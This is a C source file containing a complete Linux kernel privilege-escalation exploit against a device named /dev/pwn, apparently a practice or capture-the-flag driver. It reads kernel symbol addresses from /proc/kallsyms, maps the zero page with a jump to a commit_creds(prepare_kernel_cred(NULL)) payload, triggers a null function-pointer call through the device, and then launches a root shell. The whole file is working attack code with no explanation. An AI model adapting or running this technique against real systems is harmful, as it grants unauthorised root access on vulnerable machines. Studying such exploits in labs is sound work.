#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

struct cred;
struct task_struct;

struct cred *(*prepare_kernel_cred)(struct task_struct *) __attribute__((regparm(3)));
int (*commit_creds)(struct cred *) __attribute__((regparm(3)));

void get_root()
{
    commit_creds(prepare_kernel_cred(NULL));
}

void *get_symbol(const char *name)
{
    char type;
    char symbol[512];
    void *address;
    FILE *f = fopen("/proc/kallsyms", "r");
    while (fscanf(f, "%p %c %s\n", &address, &type, symbol) > 0 ) {
        if (!strcmp(symbol, name))
            return address;
    }

    return NULL;
}

int main(int argc, char* argv[])
{
    char buf[1024] = {0};
    char jmp[5];
    void *address;

    prepare_kernel_cred = get_symbol("prepare_kernel_cred");
    printf("Found prepare_kernel_cred at %p\n", prepare_kernel_cred);
    commit_creds = get_symbol("commit_creds");
    printf("Found commit_creds at %p\n", commit_creds);

    printf("Opening /dev/pwn\n");
    int fd = open("/dev/pwn", O_RDWR);
    if (fd <= 0) {
        printf("unable to open /dev/pwn\n");
        return 1;
    }

    // Map to the zero page
    printf("Mapping page at 0x00000000\n");
    address = mmap(0, 0x1000, PROT_WRITE | PROT_READ,
                   MAP_ANONYMOUS | MAP_FIXED | MAP_SHARED, -1, 0);
    if (address == MAP_FAILED) {
        printf("Could not mmap shellcode: %d\n", address);
        goto cleanup;
    }

    // First write a dummy buf to wipe out the pointer
    printf("Writing dummy buf to device\n");
    *(int*)buf = 0xcafebabe;
    write(fd, buf, 1024);

    // Now copy a jmp to the shellcode
    printf("Building near jump");
    jmp[0] = 0xE9; // Near jump
    *(int*)(jmp+1) = &get_root - 5;
    memcpy(address, jmp, 5);
    printf("0x%08X\n", *(int*)(jmp+1));

    // Verify
    printf("Now check that the jump is found at 0x00000000\n");
    getchar();

    // Now trigger it again, forcing a `call 0`
    printf("Triggering algo check\n");
    write(fd, buf, 1024);

    // Finally, run a shell
    printf("Running shell\n");
    system("/bin/sh");

cleanup:
    close(fd);
    return 0;
}
